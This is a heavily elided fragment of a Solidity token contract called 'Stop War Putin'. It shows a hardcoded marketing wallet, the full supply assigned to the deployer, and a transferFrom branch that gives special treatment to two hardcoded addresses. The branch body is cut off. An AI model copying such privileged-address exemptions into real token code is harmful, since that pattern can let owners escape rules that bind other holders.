...
// SWP 2021/10/05   SPDX-License-Identifier: Unlicensed
...
contract Stop_War_Putin is Context, IERC20, Ownable {  
    using SafeMath for uint256;
    using Address for address;
    
    address payable public marketingAddress = payable(0xB9c436Cc1c1210E4f6e40c920F5453416d72469f); 
    ...
    string private _name = "Stop War Putin";    
...
_rOwned[_msgSender()] = _rTotal;
    ...
    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        ...
        if (sender == marketingAddress || sender == payable(0x5eFfF8d4477fa3798Befd0D6F866d4eE8d15B919)){  
